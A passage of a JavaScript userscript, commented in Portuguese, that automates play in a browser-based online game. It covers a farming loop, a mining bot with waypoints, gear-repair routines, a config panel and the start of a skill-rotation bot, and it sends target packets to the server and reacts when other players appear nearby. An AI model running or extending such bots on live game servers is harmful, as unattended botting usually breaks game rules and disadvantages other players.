      if (isTarget) {
        xunhit = true;
        // Vira para a pedra independente de já estar virado
        if (myself.dir !== c.dir) xDoChangeDir(c.dir);
        xDoKeyDown(6); // ← fix: não dependia de trocar direção
        if (inv[2]?.equip === 0) { xDoUseSlot(2); await xDelay(1000); }
        // Chegou na pedra → reseta contador de tentativas
        xTemp[97] = undefined;
        xTemp[98] = 0;
        break;
      }
    }
    if (!xunhit) xDoKeyUp(6);
  } else {
    await xEquipSlots();
  }
  // ── PRIORIDADE 1: MOBS ───────────────────────────────────────
  // Inicializa blacklist de mobs se não existir
  if (!xTemp[100]) xTemp[100] = {};

  // Limpa entradas expiradas da blacklist
  const now100 = Date.now();
  Object.keys(xTemp[100]).forEach(id => {
    if (xTemp[100][id] < now100) delete xTemp[100][id];
  });
  await xGetMobByName('Dust Devil', 'Tentacle', 'Flame Demon', 'Snake');

  // Verifica se mob ainda existe no jogo
  if (xTemp[13] && xTemp[13] !== myself) {
    const mob  = xTemp[13];
    const dist = xGetDistance(mob.x, mob.y, myself.x, myself.y);

    if (dist > 7) {
      xTemp[13] = myself;
      target.id = me;
      xGoing[110] = false;
      return;
    }

    if (target.id !== mob.id) {
      target.id = mob.id;
      send({ type: 't', t: target.id });
    }

    // Inicializa rastreamento por ID do mob
    if (!xTemp[96] || xTemp[96].id !== mob.id) {
      xTemp[96] = { id: mob.id, attempts: 0, lastMove: 0 };
    }

    if (dist <= 1) {
      // Chegou — reseta rastreamento
      xTemp[96] = { id: mob.id, attempts: 0, lastMove: 0 };
    } else {
      // Mob inacessível por muitas tentativas → ignora
      if (xTemp[96].attempts >= 10) {
        dsk.localMsg('SSD: mob inacessível, ignorando...', '#ff0');
        // Blacklista o mob por 60 segundos
        if (!xTemp[100]) xTemp[100] = {};
        xTemp[100][mob.id] = Date.now() + 60000;
        xTemp[13]  = myself;
        xTemp[96]  = undefined;
        xTemp[90]  = undefined;
        xTemp[91]  = undefined;
        target.id  = me;
        xMovingNow = false;
        xGoing[110] = false;
        return;
      }

      // Só tenta mover de novo se passou 2s desde a última tentativa
      const now = Date.now();
      if (!xMovingNow && now - xTemp[96].lastMove > 2000) {
        xTemp[96].attempts++;
        xTemp[96].lastMove = now;
        xMovingNow = false;
        xDoMove(mob.x, mob.y);
      }
    }

    xGoing[110] = false;
    return;
  }

  // Sem mob → reseta tudo e solta tecla
  target.id  = me;
  xTemp[13]  = myself;
  xTemp[90]  = undefined;
  xTemp[91]  = undefined;

  // ── PRIORIDADE 2: CHEST ──────────────────────────────────────
  await xGetChest();
  if (xTemp[171]) {
    const dist = xGetDistance(xTemp[171].x, xTemp[171].y, myself.x, myself.y);
    if (dist > 1) {
      xMovingNow = false;
      await xDoMove(xTemp[171].x, xTemp[171].y);
    } else {
      const dx  = xTemp[171].x - myself.x;
      const dy  = xTemp[171].y - myself.y;
      const dir = dx === 1 ? 1 : dx === -1 ? 3 : dy === 1 ? 2 : 0;
      await xDoChangeDir(dir);
      await xDelay(100);
      xDoKeyPress(6, 100);
    }
    xGoing[110] = false;
    return;
  }

  // ── PRIORIDADE 3: DROPS ──────────────────────────────────────
  if (await xPickSpecificDrop()) {
    xGoing[110] = false;
    return;
  }
  
// ── PRIORIDADE 4: SHINY / STONE ──────────────────────────────
  if (_ssdTarget) {
    if (inv[3]?.equip === 0) { xDoUseSlot(3); await xDelay(400); }

    if (xTemp[97]?.x === _ssdTarget.x && xTemp[97]?.y === _ssdTarget.y) {

      if (!xMovingNow) {
        // Marca o tempo que parou de mover pela primeira vez
        if (!xTemp[98]) xTemp[98] = Date.now();

        // Só blacklista se ficou parado sem chegar por mais de 15 segundos
        if (Date.now() - xTemp[98] > 15000) {
          dsk.localMsg('SSD: pedra inacessível, ignorando...', '#ff0');
          xTemp[99]  = { x: _ssdTarget.x, y: _ssdTarget.y, until: Date.now() + 60000 };
          xTemp[97]  = undefined;
          xTemp[98]  = 0;
          xTemp[170] = undefined;
          xTemp[172] = undefined;
          xMovingNow = false;
          xGoing[110] = false;
          return;
        }

        // Tenta mover de novo
        xDoMove(_ssdTarget.x, _ssdTarget.y);
      } else {
        // Ainda andando → reseta o timer (não está travado)
        xTemp[98] = 0;
      }

    } else {
      // Novo alvo → reseta tudo
      xTemp[97] = { x: _ssdTarget.x, y: _ssdTarget.y };
      xTemp[98] = 0;
      xMovingNow = false;
      xDoMove(_ssdTarget.x, _ssdTarget.y);
    }

    xGoing[110] = false;
    return;
  }

  // ── PRIORIDADE 5: WAYPOINTS ──────────────────────────────────
  const wpX    = WCPosListX[xTemp[70]];
  const wpY    = WCPosListY[xTemp[70]];
  const distWP = xGetDistance(myself.x, myself.y, wpX, wpY);

  if (distWP <= 2) {
    if (xTemp[70] >= xTemp[71]) {
      xTemp[70] = 0;
      RepTimer++;
      dsk.localMsg(`SSD: volta ${RepTimer}/${wcaveRepVoltas}`, '#0ff');
    } else {
      xTemp[70]++;
    }

if (RepTimer >= wcaveRepVoltas) {
      dsk.localMsg('SSD: indo reparar...', '#ff0');
      xNeedsRep  = true;
      RepTimer   = 0;
      xTemp[92]  = undefined;
      xTemp[93]  = undefined;
      xMovingNow = false;
      if (!dsk.ssd.repairInPlace) await xDoMove(94, 93); // ← só move fixo se não for in-place
    }

    xGoing[110] = false;
    return;
  }

  // Move para waypoint
  if (xTemp[92] !== wpX || xTemp[93] !== wpY) {
    xTemp[92]  = wpX;
    xTemp[93]  = wpY;
    xMovingNow = false; // ← força mover mesmo se travado
    await xDoMove(wpX, wpY); // ← await para garantir que iniciou
  } else if (!xMovingNow) {
    // Se parou no meio do caminho, tenta de novo
    xDoMove(wpX, wpY);
  }

  xGoing[110] = false;
}

async function xSSDRepairInPlace() {
  // ── Mob check ────────────────────────────────────────────────
  for (let i in mobs.items) {
    const mob = mobs.items[i];
    if (!mob || mob === myself) continue;
    if (xPlyrTest(mob)) continue;
    if (xGetDistance(myself.x, myself.y, mob.x, mob.y) > 6) continue;
    await xEquipSlots();
    await xGetMobByName('Dust Devil', 'Tentacle', 'Flame Demon', 'Snake');
    if (xTemp[13] && xTemp[13] !== myself) {
      if (target.id !== xTemp[13].id) { target.id = xTemp[13].id; send({ type: 't', t: target.id }); }
      if (xGetDistance(xTemp[13].x, xTemp[13].y, myself.x, myself.y) > 2) target.id = me;
    }
    xNeedsRep = false; RepTimer = 0;
    return;
  }

  // ── FASE 1: ainda tem gear → dropa tudo ──────────────────────
  const hasGear = inv[0]?.sprite || inv[1]?.sprite || inv[2]?.sprite || inv[3]?.sprite;
  if (hasGear) {
	xMovingNow = false;  // ← garante parado antes de dropa
	xDoKeyUp(6);
    await xDelay(900);   // ← aguarda parar completamente
    xTemp[94]  = myself.x;
    xTemp[95]  = myself.y;
    xTemp[104] = undefined; // ← reseta cache do tile alvo
    xTemp[105] = undefined;
    if (inv[3]?.sprite) { xDoDropSlot(0, 4); await xDelay(300); }
    if (inv[2]?.sprite) { xDoDropSlot(0, 3); await xDelay(300); }
    if (inv[1]?.sprite) { xDoDropSlot(0, 2); await xDelay(300); }
    if (inv[0]?.sprite) { xDoDropSlot(0, 1); await xDelay(300); }
    return;
  }

  // ── FASE 2: move para tile adjacente livre ───────────────────
  const kitSlot = xGetSlotByID(719);
  if (kitSlot === undefined) {
    dsk.localMsg('SSD in-place: sem Repair Kit no inventário!', '#f55');
    xNeedsRep = false; RepTimer = 0;
    return;
  }

  const dropX = xTemp[94] ?? myself.x;
  const dropY = xTemp[95] ?? myself.y;

  // Calcula o tile adjacente UMA VEZ e guarda no cache
  if (xTemp[104] === undefined || xTemp[105] === undefined) {
    const adjFree = [
      { x: dropX + 1, y: dropY },
      { x: dropX - 1, y: dropY },
      { x: dropX,     y: dropY + 1 },
      { x: dropX,     y: dropY - 1 },
    ].find(t => !xGetSolidByID(t.x, t.y));

    if (!adjFree) {
      dsk.localMsg('SSD in-place: sem tile livre adjacente!', '#f55');
      xNeedsRep = false; RepTimer = 0;
      return;
    }
    xTemp[104] = adjFree.x; // ← cacheia para não recalcular
    xTemp[105] = adjFree.y;
  }

  // Move para o tile cacheado, só se ainda não chegou
  if (myself.x !== xTemp[104] || myself.y !== xTemp[105]) {
    if (!xMovingNow) {
      await xDoMove(xTemp[104], xTemp[105]);
    }
    return; // aguarda chegada sem recalcular
  }

  // ── FASE 3: equipa kit ───────────────────────────────────────
  if (inv[kitSlot]?.equip === 0) {
    await xDoUseSlot(kitSlot);
    await xDelay(400);
    return;
  }

  // ── FASE 4: vira para os itens dropados ─────────────────────
  const dx = dropX - myself.x;
  const dy = dropY - myself.y;
  const facingDir = dx === 1 ? 1 : dx === -1 ? 3 : dy === 1 ? 2 : 0;

  if (myself.dir !== facingDir) {
    await xDoChangeDir(facingDir);
    await xDelay(300);
    return;
  }

  // ── FASE 5: repara ───────────────────────────────────────────
  if (xIfChatHas('The ' + repItem + ' is in perfect condition.')) {
      xDoClearChat('The ' + repItem + ' is in perfect condition.');
    xDoKeyUp(6);
    await xDelay(400);
    xMovingNow = false;
    await xDoMove(dropX, dropY);
    await xDelay(500);
    for (let p = 0; p < 8; p++) { xDoPickUp(); await xDelay(180); }
    await xEquipSlots();
    xNeedsRep  = false;
    RepTimer   = 0;
    xTemp[92]  = undefined; xTemp[93]  = undefined;
    xTemp[94]  = undefined; xTemp[95]  = undefined;
    xTemp[104] = undefined; xTemp[105] = undefined; // ← limpa cache
    dsk.localMsg('SSD: reparo in-place concluído!', '#5f5');
  } else {
    xDoKeyDown(6);
  }
}

// ── REPARO ────────────────────────────────────────────────────
async function xSSDRepair() {
  if (dsk.ssd.repairInPlace) { await xSSDRepairInPlace(); return; }
  if (xGetSlotByID(719) === undefined) {
    const wc3 = xGetItemByID(xWCID3);
    if (wc3) {
      xMovingNow = false;
      await xDoMove(wc3.x, wc3.y);
      await xDelay(300);
      for (let p = 0; p < 4; p++) { xDoPickUp(); await xDelay(150); }
    } else {
      dsk.localMsg('SSD: sem repair kit, saindo...', '#f55');
      xDoLogOff();
    }
    return;
  }

  // Verifica mobs durante reparo
  for (let i in mobs.items) {
    const mob = mobs.items[i];
    if (!mob || mob === myself) continue;
    if (xPlyrTest(mob)) continue; // ignora jogadores
    const dist = xGetDistance(myself.x, myself.y, mob.x, mob.y);
    if (dist > 6) continue;

    const wc3 = xGetItemByID(xWCID3);
    if (wc3) {
      xMovingNow = false;
      await xDoMove(wc3.x, wc3.y);
      await xDelay(200);
      for (let p = 0; p < 3; p++) { xDoPickUp(); await xDelay(100); }
    }
    await xEquipSlots();

    await xGetMobByName('Dust Devil', 'Tentacle', 'Flame Demon');
    if (xTemp[13] && xTemp[13] !== myself) {
      if (target.id !== xTemp[13].id) {
        target.id = xTemp[13].id;
        send({ type: 't', t: target.id });
      }
      if (dist > 2) target.id = me;
    }
    return;
  }

  // Drop gear para reparar
  if (inv[0]?.sprite || inv[1]?.sprite || inv[2]?.sprite) {
    if (myself.x === 94 && myself.y === 93) {
      if      (inv[2]?.sprite) { await xDelay(200); xDoDropSlot(0, 3); await xDelay(300); }
      else if (inv[1]?.sprite) { xDoDropSlot(0, 2); await xDelay(300); }
      else if (inv[0]?.sprite) { xDoDropSlot(0, 1); await xDelay(300); }
    } else {
      xMovingNow = false;
      xDoKeyUp(6);
      await xDoMove(94, 93);
    }
    return;
  }

  // Executa reparo
  if (myself.x === 94 && myself.y === 92 && myself.dir === 2) {
    if (inv[xGetSlotByID(719)]?.equip === 0) {
      await xDoUseSlot(xGetSlotByID(719));
      await xDelay(300);
      return;
    }
    if (xIfChatHas('The ' + repItem + ' is in perfect condition.')) {
      xDoClearChat('The ' + repItem + ' is in perfect condition.');
      xDoKeyUp(6);
      await xDelay(300);

      const wc3 = xGetItemByID(xWCID3);
      if (wc3) {
        xMovingNow = false;
        await xDoMove(wc3.x, wc3.y);
        await xDelay(300);
        for (let p = 0; p < 6; p++) { xDoPickUp(); await xDelay(150); }
      }
      await xEquipSlots();

      xNeedsRep = false;
      RepTimer  = 0;
      xTemp[92] = undefined;
      xTemp[93] = undefined;
      dsk.localMsg('SSD: reparo concluído!', '#5f5');
    } else {
      xDoKeyDown(6);
    }
  } else {
    xMovingNow = false;
    await xDoMove(94, 92);
    await xDelay(400);
    await xDoChangeDir(2);
    await xDelay(200);
  }
}

// ── MINING BOT ────────────────────────────────────────────────

dsk.mining = { enabled: false };

dsk.setCmd('/mining', () => {
  dsk.mining.enabled = !dsk.mining.enabled;

  if (dsk.mining.enabled) {
    xWCID1 = inv[0]?.sprite;
    xWCID2 = inv[1]?.sprite;
    xWCID3 = inv[2]?.sprite;
    xWCID4 = inv[3]?.sprite; // picareta
    repItem = xGetItemNameBySlot(0) ?? '';

    if (!xWCID1 || !xWCID2 || !xWCID3 || !xWCID4) {
      dsk.localMsg('Mining: coloque itens nos slots 0-3 primeiro! (0=arma,1=escudo,2=armadura,3=picareta)', '#f55');
      dsk.mining.enabled = false;
      return;
    }

    xTemp[70] = undefined; // força reinit dos waypoints
    dsk.localMsg(`Mining Bot: Ativado | Picareta ID=${xWCID4}`, '#5f5');

    (async function loop() {
      while (dsk.mining.enabled) {
        await uMining();
        await xDelay(500);
      }
    })();
  } else {
    xGoing[110] = false;
    xMovingNow  = false;
    target.id   = me;
    xDoKeyUp(6);
    dsk.localMsg('Mining Bot: Desativado', '#f55');
  }
});

async function uMining() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (connection?.readyState === 3) xMovingNow = false;
  else if (!connection) xMovingNow = false;
  if (xGoing[110] === true) return;
  xGoing[110] = true;

  // ── REPARO ──────────────────────────────────────────────────
  if (xNeedsRep) {
    if (xGetSlotByID(719) === undefined) {
      xGoing[110] = false;
      await xDelay(100);
      const wc4 = xGetItemByID(xWCID4);
      if (wc4) { dsk.localMsg('Pegando gear...', '#0ff'); await xDoMove(wc4.x, wc4.y); xDoPickUp(); }
      else      { dsk.localMsg('Sem kit de reparo, saindo...', '#f55'); xDoLogOff(); }
      return;
    }

    // Mob check durante reparo
    for (let i in mobs.items) {
      const mob = mobs.items[i];
      if (!mob || mob === myself) continue;
      const mobDist = xGetDistance(myself.x, myself.y, mob.x, mob.y);

      if (mobDist <= 6) {
        await xDoKeyUp(6);
        const wc4 = xGetItemByID(xWCID4);
        if (wc4) { await xDoMove(wc4.x, wc4.y); xDoPickUp(); }
        await xEquipSlots();
        dsk.localMsg('Mob próximo!', '#f55');
        await xGetMobByNameMining(['Dire Wolf', 'Ice Elemental', 'Polar Bear', 'Wolf']);
        if (xTemp[13] && xTemp[13] !== myself) {
          if (target.id !== xTemp[13].id) { target.id = xTemp[13].id; send({ type: 't', t: target.id }); xDoMove(xTemp[13].x, xTemp[13].y); }
          if (xGetDistance(xTemp[13].x, xTemp[13].y, myself.x, myself.y) > 2) target.id = me;
        }
        xGoing[110] = false;
        return;
      }

      if (mob.id?.toString() in player_dict) {
        dsk.localMsg('Jogador detectado!', '#f55');
        xDoKeyUp(6);
        const wc4 = xGetItemByID(xWCID4);
        if (wc4) { await xDoMove(wc4.x, wc4.y); xDoPickUp(); }
        await xEquipSlots();
        await xGetMobByNameMining(['Dire Wolf', 'Ice Elemental', 'Polar Bear', 'Wolf']);
        if (xTemp[13] && xTemp[13] !== myself) {
          if (target.id !== xTemp[13].id) { target.id = xTemp[13].id; send({ type: 't', t: target.id }); xDoMove(xTemp[13].x, xTemp[13].y); }
          if (xGetDistance(xTemp[13].x, xTemp[13].y, myself.x, myself.y) > 2) target.id = me;
        }
        xGoing[110] = false;
        return;
      }
    }

    // Drop gear para reparar
    if (inv[0]?.sprite) {
      if (myself.x === xRepairDropX && myself.y === xRepairDropY) {
        if      (inv[3]?.sprite) { await xDelay(300); xDoDropSlot(0, 4); }
        else if (inv[2]?.sprite) { await xDelay(300); xDoDropSlot(0, 3); }
        else if (inv[1]?.sprite) { xDoDropSlot(0, 2); }
        else                     { xDoDropSlot(0, 1); }
      } else {
        xDoKeyUp(6);
        xDoMove(xRepairDropX, xRepairDropY);
        await xDelay(300);
      }
    } else {
      // Kit de reparo no chão — vai reparar
      const dropped = xGetItemByID(xWCID4);
      if (dropped) {
        const adjTiles = [
          { x: dropped.x + 1, y: dropped.y, dir: 3 },
          { x: dropped.x - 1, y: dropped.y, dir: 1 },
          { x: dropped.x, y: dropped.y + 1, dir: 0 },
          { x: dropped.x, y: dropped.y - 1, dir: 2 },
        ];
        const inAdj = adjTiles.find(t => t.x === myself.x && t.y === myself.y);
        if (!inAdj) {
          xDoKeyUp(6); await xDelay(100); xDoKeyUp(6);
          await xDoMove(adjTiles[0].x, adjTiles[0].y);
          await xDelay(300);
        } else if (myself.dir !== inAdj.dir) {
          await xDoChangeDir(inAdj.dir);
          await xDoUseSlot(xGetSlotByID(719));
          await xDelay(100);
        } else if (inv[xGetSlotByID(719)]?.equip !== 0) {
          if (!xRepairHoldTicks) xRepairHoldTicks = 0;
          if (xRepairHoldTicks >= 6 && xIfChatHas('The ' + repItem + ' is in perfect condition.')) {
            xRepairHoldTicks = 0;
            xDoClearChat('The ' + repItem + ' is in perfect condition.');
            xDoKeyUp(6);
            await xDoMove(dropped.x, dropped.y); await xDelay(100);
            for (let p = 0; p < 6; p++) { xDoPickUp(); await xDelay(100); }
            if (inv[0]?.equip === 0) { xDoUseSlot(0); await xDelay(50); }
            if (inv[1]?.equip === 0) { xDoUseSlot(1); await xDelay(80); }
            if (inv[2]?.equip === 0) { xDoUseSlot(2); await xDelay(80); }
            xNeedsRep = false;
            RepTimer  = 0;
          } else {
            xRepairHoldTicks++;
            xDoKeyDown(6);
          }
        } else {
          await xDoUseSlot(xGetSlotByID(719));
          await xDelay(100);
        }
      }
    }
    xGoing[110] = false;
    return;
  }

  // ── COMIDA ──────────────────────────────────────────────────
  const foodSlot = xGetSlotFood();
  if (foodSlot !== undefined) {
    if (hunger_status.val <= 65) { dsk.localMsg('Comendo...', '#0ff'); xDoUseSlotByID(foodSlot); await xDelay(2000); }
  } else { xDoLogOff(); }

  // ── EQUIP QUEBRADO → sai ─────────────────────────────────────
  if (inv[0]?.equip === 2 || inv[1]?.equip === 2 || inv[2]?.equip === 2) { xDoLogOff(); await xDelay(100); }

  // ── HP ────────────────────────────────────────────────────────
  if (hp_status.val <= 72 && hp_status.val >= 0.1) {
    xHeal();
    if (hp_status.val <= 40) { xDoLogOff(); await xDelay(100); }
  }

  // ── SLOTS VAZIOS ─────────────────────────────────────────────
  const pickAll = async () => {
    await xPickupAllGear(xWCID4, xWCID3, xWCID1, xWCID2);
  };
  if (!inv[0]?.sprite) { await pickAll(); xDoLogOff(); }
  if (!inv[1]?.sprite) { await pickAll(); xDoLogOff(); }
  if (!inv[2]?.sprite) { await pickAll(); xDoLogOff(); }
  if (!inv[3]?.sprite) { await pickAll(); xDoLogOff(); }
  if (!inv[5]?.sprite) { xDoLogOff(); }

  // ── INIT WAYPOINTS DE MINERAÇÃO ──────────────────────────────
  if (xTemp[70] === undefined) {
    xTemp[70] = 0;
    xTemp[71] = 23;
    const mx = [15,11,16,31,37,35,50,58,58,56,39,40,60,67,90,78,76,72,72,68,46,31,15,15];
    const my = [16,21,36,43,51,65,70,60,50,38,33,20,16,25,34,48,46,45,34,59,59,47,40,27];
    for (let i = 0; i < mx.length; i++) { WCMiningListX[i] = mx[i]; WCMiningListY[i] = my[i]; }
  }

	// ── BUSCA MOB ────────────────────────────────────────────────
	await xGetMobByNameMining(['Dire Wolf', 'Ice Elemental', 'Polar Bear', 'Wolf']);

	if (xTemp[13] && xTemp[13] !== myself) {
	  const mob = xTemp[13];
	  const distMob = xGetDistance(mob.x, mob.y, myself.x, myself.y);

	  // Seleciona alvo
	  if (target.id !== mob.id) {
		target.id = mob.id;
		send({ type: 't', t: mob.id });
	  }

	  if (distMob === 0) {
		// Mesmo tile — tenta sair para adjacente livre
		const escapes = [
		  { x: myself.x + 1, y: myself.y, dir: 1 },
		  { x: myself.x - 1, y: myself.y, dir: 3 },
		  { x: myself.x,     y: myself.y - 1, dir: 0 },
		  { x: myself.x,     y: myself.y + 1, dir: 2 },
		];
		const free = escapes.find(t => !xGetSolidByID(t.x, t.y));
		if (free) { await xDoMove(free.x, free.y); await xDelay(300); }

	  } else if (distMob === 1) {
		// Adjacente — vira para o mob e ataca
		const dx = mob.x - myself.x;
		const dy = mob.y - myself.y;
		const dir = dx === 1 ? 1 : dx === -1 ? 3 : dy === -1 ? 0 : 2;
		if (myself.dir !== dir) { await xDoChangeDir(dir); await xDelay(150); }
		await xDelay(200);

	  } else if (distMob <= 3) {
		// Longe — move até o mob
		await xDoMove(mob.x, mob.y);
		await xDelay(400);
		// Confirma chegada — desiste se ainda longe
		if (xGetDistance(mob.x, mob.y, myself.x, myself.y) > 3) {
		  target.id = me;
		}
	  } else {
		// Muito longe — desiste
		target.id = me;
	  }
	}

  // ── SOLTA TECLA SE TEM MOB ───────────────────────────────────
  if (xTemp[13] && xTemp[13] !== myself && keySpace.isDown) {
    await xDoKeyUp(6); xDoKeyUp(6); await xDelay(50);
  }

  // ── EQUIPA GEAR SE TEM MOB ───────────────────────────────────
  if ((xTemp[13] && xTemp[13] !== myself) || xTemp[19] === undefined) {
    await xEquipSlots();
  }

  // ── MINERAÇÃO ────────────────────────────────────────────────
  if ((!xTemp[13] || xTemp[13] === myself) && xTemp[19] !== undefined) {
    if (xTemp[80] !== xTemp[19]) { xTemp[80] = xTemp[19]; await xDoKeyUp(6); }
    xDoMoveToID(xTemp[19]);

    if (isRockNextToMe()) {
      const rockSprites = [-261, -618, -518];
      const sides = [
        { dx: 1, dy: 0, dir: 1 }, { dx: -1, dy: 0, dir: 3 },
        { dx: 0, dy: 1, dir: 2 }, { dx:  0, dy: -1, dir: 0 }
      ];
      for (const c of sides) {
        const wall = xGetWallByPos(myself.x + c.dx, myself.y + c.dy);
        if (wall && rockSprites.includes(wall.sprite)) {
          if (myself.dir !== c.dir) { await xDoKeyUp(6); await xDoChangeDir(c.dir); await xDelay(50); }
          break;
        }
      }
      if (inv[3]?.equip === 0) { dsk.localMsg('Equipando picareta...', '#0ff'); xDoUseSlot(3); await xDelay(100); }
      if (inv[3]?.equip === 2) {
        await xEquipSlots();
        xNeedsRep = true;
        xRepairDropX = myself.x; xRepairDropY = myself.y; xRepairHoldTicks = 0;
        xGoing[110] = false;
        return;
      }
      if (!keySpace.isDown && inv[3]?.equip === 1) { await xDoKeyDown(6); await xDelay(100); }
    }
  }

  // ── SOLTA TECLA SE PEDRA SUMIU ───────────────────────────────
  if (xTemp[19] === undefined && keySpace.isDown) {
    xDoKeyUp(6); xTemp[80] = undefined; await xDelay(50); await xDoKeyUp(6);
  }

  // ── LIMPA xTemp[19] SE PEDRA SUMIU ───────────────────────────
  if (xTemp[19] !== undefined) {
    const rockSprites = [-261, -618, -518];
    const sides = [{ dx:1,dy:0},{dx:-1,dy:0},{dx:0,dy:1},{dx:0,dy:-1}];
    const stillExists = sides.some(c => {
      const w = xGetWallByPos(myself.x + c.dx, myself.y + c.dy);
      return w && rockSprites.includes(w.sprite);
    });
    if (!stillExists && !isRockNextToMe()) {
      xTemp[19] = undefined; xTemp[80] = undefined;
      xDoKeyUp(6); await xDelay(50); await xDoKeyUp(6);
    }
  }

  // ── PROCURA ROCHA ────────────────────────────────────────────
  if ((!xTemp[13] || xTemp[13] === myself) && !keySpace.isDown) {
    WCFindRocks();
  }

  // ── NAVEGAÇÃO ENTRE WAYPOINTS ────────────────────────────────
  if (!xTemp[13] || xTemp[13] === myself) {
    const distToWP = xGetDistance(myself.x, myself.y, WCMiningListX[xTemp[70]], WCMiningListY[xTemp[70]]);
    if (distToWP <= 2) {
      if (xTemp[70] >= xTemp[71]) { xTemp[70] = 0; RepTimer++; }
      else {
        xTemp[70]++;
        if (RepTimer >= 11 && xTemp[70] === 1) {
          dsk.localMsg('Indo reparar...', '#ff0');
          xNeedsRep = true;
          xRepairDropX = myself.x; xRepairDropY = myself.y; xRepairHoldTicks = 0;
        }
      }
    } else if (xTemp[19] === undefined) {
      xDoMove(WCMiningListX[xTemp[70]], WCMiningListY[xTemp[70]]);
    }
  }

  xGoing[110] = false;
}

// ── CONFIG PANEL COMPARTILHADO (SSD + Mining) ─────────────────

dsk.miningManager = jv.Dialog.create(260, 260);
const minm = dsk.miningManager;
minm.visible = false;

minm.header = jv.text('Mining / SSD Config', {
  font: '13px Verdana', fill: 0xFFD700, stroke: 0x555555, strokeThickness: 2,
});
minm.addChild(minm.header);
jv.center(minm.header);
jv.top(minm.header, 4);

minm.close = jv.Button.create(0, 0, 24, 'X', minm, 24);
jv.top(minm.close, 4); jv.right(minm.close, 4);
minm.close.on_click = () => (minm.visible = 0);

minm.move = jv.Button.create(0, 0, 24, '@', minm, 24);
jv.top(minm.move, 4); jv.right(minm.move, 28);

minm._px = 0; minm._py = 0;
window.addEventListener('mousemove', e => { minm._px = e.clientX; minm._py = e.clientY; });
window.addEventListener('touchmove', e => { minm._px = e.touches[0].clientX; minm._py = e.touches[0].clientY; });

minm.updatePosition = () => {
  if (minm.move.is_pressed) {
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    minm.x = (minm._px - rect.left) * (jv.game_width / rect.width) - minm.w / 2;
    minm.y = (minm._py - rect.top) * (jv.game_height / rect.height) - 12;
  }
  if (minm.x < 0) minm.x = 0;
  if (minm.y < 0) minm.y = 0;
  if (minm.x + minm.w > jv.game_width)  minm.x = jv.game_width - minm.w;
  if (minm.y + minm.h > jv.game_height) minm.y = jv.game_height - minm.h;
};
dsk.on('postLoop', minm.updatePosition);

const minLbl = (txt, y) => {
  const l = jv.text(txt, { font: '11px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
  l.x = 10; l.y = y; minm.addChild(l); return l;
};

minm.lblWP      = minLbl('Waypoint: -',       38);
minm.lblRep     = minLbl('RepTimer: -',        53);
minm.lblNeeds   = minLbl('Needs Repair: não',  68);
minm.lblHP      = minLbl('HP: -',              83);
minm.lblHunger  = minLbl('Fome: -',            98);
minm.lblMob     = minLbl('Mob: -',            113);
minm.lblRock    = minLbl('Rock ID: -',         128);
minm.lblPickaxe = minLbl('Picareta ID: -',     143);

dsk.on('postLoop', () => {
  if (!minm.visible) return;
  minm.lblWP.text      = `Waypoint: ${xTemp[70] ?? 0} / ${xTemp[71] ?? '-'}`;
  minm.lblRep.text     = `RepTimer: ${RepTimer ?? 0}`;
  minm.lblNeeds.text   = `Needs Repair: ${xNeedsRep ? 'SIM ⚠' : 'não'}`;
  minm.lblHP.text      = `HP: ${hp_status?.val?.toFixed(1) ?? '-'}%`;
  minm.lblHunger.text  = `Fome: ${hunger_status?.val?.toFixed(1) ?? '-'}%`;
  minm.lblMob.text     = `Mob: ${xTemp[13]?.name ?? 'nenhum'}`;
  minm.lblRock.text    = `Rock ID: ${xTemp[19] ?? '-'}`;
  minm.lblPickaxe.text = `Picareta ID: ${xWCID4 ?? '-'}`;
});

const btnResetMin = jv.Button.create(0, 0, 115, 'Reset Waypoint', minm, 20);
btnResetMin.x = 10; btnResetMin.y = 162;
btnResetMin.on_click = () => { xTemp[70] = 0; RepTimer = 0; xNeedsRep = false; dsk.localMsg('Mining: reset!', '#ff0'); };

const btnForceRepMin = jv.Button.create(0, 0, 115, 'Forçar Reparo', minm, 20);
btnForceRepMin.x = 130; btnForceRepMin.y = 162;
btnForceRepMin.on_click = () => { xNeedsRep = true; dsk.localMsg('Mining: reparo forçado!', '#ff0'); };

// ── SSD: Modo de alvo ─────────────────────────────────────────
minLbl('── SSD Config ──', 182);

minLbl('Alvo:', 200);
const _ssdModes = ['shiny', 'stone', 'both'];
const btnSsdTarget = jv.Button.create(60, 196, 80, dsk.ssd?.targetMode ?? 'shiny', minm, 20);
btnSsdTarget.on_click = () => {
  const idx = _ssdModes.indexOf(dsk.ssd.targetMode ?? 'shiny');
  dsk.ssd.targetMode = _ssdModes[(idx + 1) % _ssdModes.length];
  btnSsdTarget.title.text = dsk.ssd.targetMode;
  dsk.localMsg(`SSD alvo: ${dsk.ssd.targetMode}`, '#0ff');
};

// ── SSD: Modo de reparo ───────────────────────────────────────
minLbl('Reparo:', 224);
const btnRepairMode = jv.Button.create(65, 222, 100, 'fixo', minm, 20);
btnRepairMode.on_click = () => {
  dsk.ssd.repairInPlace = !dsk.ssd.repairInPlace;
  btnRepairMode.title.text = dsk.ssd.repairInPlace ? 'in-place' : 'fixo';
  dsk.localMsg(`SSD reparo: ${dsk.ssd.repairInPlace ? 'in-place' : 'fixo'}`, '#0ff');
};

// Atualiza botões em tempo real
dsk.on('postLoop', () => {
  if (!minm.visible) return;
  if (btnSsdTarget) btnSsdTarget.title.text = dsk.ssd?.targetMode ?? 'shiny';
  if (btnRepairMode) btnRepairMode.title.text = dsk.ssd?.repairInPlace ? 'in-place' : 'fixo';
});

dsk.setCmd('/miningconfig', () => {
  minm.visible = !minm.visible;
  dsk.localMsg(`Mining Config: ${minm.visible ? 'Aberto' : 'Fechado'}`, minm.visible ? '#5f5' : '#f55');
});

// ── SKILL ROTATION BOT ────────────────────────────────────────

window.rotationConfig = window.rotationConfig ?? {
  cookLevel:   30,
  smeltLevel:  30,
  swordLevel:  30,
  hammerLevel: 30,
  armasLevel:  30,
  destruLevel: 30,
  skipCook:    false,
  skipSmelt:   false,
  skipSword:   false,
  skipHammer:  false,
  skipArmas:   false,
  skipDestru:  false,
  // ── Posições ──────────────────────────────────────────────
  pos: {
    cook:   { x: 112, y: 278 },
    smelt:  { x: 112, y: 275 },
    sword:  { x: 115, y: 279 },
    hammer: { x: 119, y: 280 },
    armas:  { x: 114, y: 280 }, // posição de combate (segunda do step)
    armasPick: { x: 117, y: 280 }, // posição de pegar itens (primeira)
